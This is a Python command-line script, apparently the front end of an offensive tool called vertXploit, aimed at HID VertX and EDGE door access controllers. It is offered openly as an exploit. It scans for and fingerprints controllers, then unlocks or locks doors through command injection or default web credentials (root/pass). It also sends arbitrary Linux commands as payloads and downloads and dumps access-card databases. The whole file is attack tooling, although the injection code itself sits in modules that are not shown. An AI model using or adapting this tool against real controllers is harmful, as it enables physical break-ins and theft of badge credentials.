#!/usr/bin/env python
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import os
import re
import tabulate

from vertXploit.main import Actions
from vertXploit.database import Database
from vertXploit.helpers import Helpers

utils = Helpers()


def main():
	parser = argparse.ArgumentParser(prog='vertXploit.py', description='Exploit HID VertX and EDGE door controllers through command injection or the web interface.', usage='./vertXploit.py [discover, fingerprint, unlock, lock, raw, download, dump] [-h]')
	subparsers = parser.add_subparsers(dest='action', help='Action to perform on controller')

	discover_parser = subparsers.add_parser('discover', help='Discover controllers', usage='./vertXploit.py discover --ip IP')
	discover_parser.add_argument('--ip', dest='ip', help='Controller IP address (default: 255.255.255.255)', default='255.255.255.255')

	fingerprint_parser = subparsers.add_parser('fingerprint', help='Fingerprint controller', usage='./vertXploit.py fingerprint IP')
	fingerprint_parser.add_argument('ip', help='Controller IP address')

	unlock_parser = subparsers.add_parser('unlock', help='Unlock doors', usage='./vertXploit.py unlock IP --username USERNAME --password PASSWORD')
	unlock_parser.add_argument('ip', help='Controller IP address')
	unlock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root')
	unlock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass')

	lock_parser = subparsers.add_parser('lock', help='Lock doors', usage='./vertXploit.py lock IP --username USERNAME --password PASSWORD')
	lock_parser.add_argument('ip', help='Controller IP address')
	lock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root')
	lock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass')

	raw_parser = subparsers.add_parser('raw', help='Send raw Linux command', usage='./vertXploit.py raw IP COMMAND')
	raw_parser.add_argument('ip', help='Controller IP address')
	raw_parser.add_argument('command', help='Linux command, (example: ping -c 5 IP)', nargs='+')

	download_parser = subparsers.add_parser('download', help='Download card databases', usage='./vertXploit.py download IP --username USERNAME --password PASSWORD')
	download_parser.add_argument('ip', help='Controller IP address')
	download_parser.add_argument('--username', help='Web interface username, (default: root)', default='root')
	download_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass')

	dump_parser = subparsers.add_parser('dump', help='Dump card values from databases', usage='./vertXploit.py dump --path PATH')
	dump_parser.add_argument('--path', help='Path to database files', default='.')

	args = parser.parse_args()

	if args.action == 'discover':
		discover(args.ip)
	elif args.action == 'fingerprint':
		fingerprint(args.ip)
	elif args.action == 'unlock':
		unlock(args.ip, args.username, args.password)
	elif args.action == 'lock':
		lock(args.ip, args.username, args.password)
	elif args.action == 'raw':
		raw(args.ip, args.username, args.password, ''.join(args.command))
	elif args.action == 'download':
		download(args.ip, args.username, args.password)
	else:
		dump(args.path)


# Discover
def discover(ip):
	vertx = Actions(ip)
	if ip == '255.255.255.255':
		utils.print_status('Sending discovery request to local broadcast network')
	else:
		utils.print_status('Starting Nmap scan on local subnet')

	controllers = vertx.discover()

	if len(controllers) > 0:
		utils.print_good('VertX controllers found:')
		print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC'], tablefmt='psql', stralign='center', numalign='center'))
	else:
		utils.print_warn('No VertX controllers found')


# Fingerprint
def fingerprint(ip):
	utils.print_status("Sending discovery request to {0}".format(ip))
	vertx = Actions(ip)
	vertx_info = vertx.fingerprint()
	if None not in vertx_info.values():
		utils.print_good("VertX Controller Information")
		print("RAW: {0}".format(vertx_info['raw']))
		print("Name: {0}".format(vertx_info['name']))
		print("Model: {0}".format(vertx_info['model']))
		print("Version: {0} - ({1})".format(vertx_info['version'], vertx_info['data']))
		print("Internal IP Address: {0}".format(vertx_info['internal_ip']))
		print("External IP Address: {0}".format(vertx_info['external_ip']))
		print("MAC Address: {0}".format(vertx_info['mac']))

		if vertx_info['vulnerable']:
			print("Vulnerable: \033[1m\033[32mTrue\033[0m")
		else:
			print("Vulnerable: \033[1m\033[33mFalse\033[0m")
	else:
		utils.print_warn('VertX controller did not responded to the discovery request')


# Unlock
def unlock(ip, username, password):
	vertx = Actions(ip)
	vertx_info = vertx.fingerprint()
	if vertx_info['vulnerable']:
		utils.print_status('Unlocking doors using command injection')
		response = vertx.unlock()
		if response[0].split(';')[0] == 'ack':
			utils.print_good('Door successfully unlocked')
		else:
			utils.print_warn('Door unlock failed')
	else:
		utils.print_status('Unlocking doors through the web interface')
		response = vertx.web_unlock(username, password)
		if response is False:
			utils.print_warn('Door unlock failed, bad credentials')
		elif response is None:
			utils.print_error('VertX controller did not respond')
		else:
			if (response['text']).split(';')[1] == ';-1504;':
				utils.print_good('Door successfully unlocked')
			elif (response['text']).split(';')[1] == ';0;':
				utils.print_warn('Door unlock failed')
			else:
				utils.print_error('VertX controller returned an unknown response')
				print(response)


# Lock
def lock(ip, username, password):
	vertx = Actions(ip)
	vertx_info = vertx.fingerprint()
	if vertx_info['vulnerable']:
		utils.print_status('Locking doors using command injection')
		response = vertx.lock()
		if response[0].split(';')[0] == 'ack':
			utils.print_good('Door successfully locked')
		else:
			utils.print_warn('Door lock failed')
	else:
		utils.print_status('Locking doors through the web interface')
		response = vertx.web_lock(username, password)
		if response is False:
			utils.print_warn('Door lock failed, bad credentials')
		elif response is None:
			utils.print_error('VertX controller did not respond')
		else:
			if (response['text']).split(';')[1] == ';-1504;':
				utils.print_good('Door successfully locked')
			elif (response['text']).split(';')[1] == ';0;':
				utils.print_warn('Door lock failed')
			else:
				utils.print_error('VertX controller returned an unknown response')
				print(response)


# Raw
def raw(ip, username, password, command):
	if len(command) > 41:
		utils.print_error('Command is too long to send in one request')
	else:
		vertx = Actions(ip, username, password)
		vertx_info = vertx.fingerprint()
		if vertx_info['vulnerable']:
			utils.print_status('Sending raw payload')
			response = vertx.raw(command)
			if response[0].split(';')[0] == 'ack':
				utils.print_good('Payload sent successfully')
			else:
				utils.print_error('Failed to send payload')
		else:
			utils.print_error('VertX controller is not vulnerable to command injection')


# Download
def download(ip, username, password):
	vertx = Actions(ip)
	vertx_info = vertx.fingerprint()
	if vertx_info['vulnerable']:
		utils.print_status('Downloading VertX databases')
		database_responses = vertx.download(username, password)
		for database in database_responses:
			if database_responses[database]:
				utils.print_good("Successfully downloaded {0}".format(database))
			elif database_responses[database] is False:
				utils.print_warn('Download failed, bad username or password')
				break
			else:
				utils.print_error("Unable to find database at http://{0}/{1}".format(ip, database))
	else:
		utils.print_error('VertX controller is not vulnerable to command injection')


# Dump
def dump(path):
	if os.path.isfile("{0}/IdentDB".format(path)) and os.path.isfile("{0}/AccessDB".format(path)):
		utils.print_status('Processing card information from VertX databases')
		card_data = Database(path).dump()
		if len(card_data) > 0:
			print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
		else:
			utils.print_warn('No card data in database')
	else:
		utils.print_error("Could not find IdentDB or AccessDB in {0}/".format(os.path.abspath(path)))

if __name__ == '__main__':
	main()
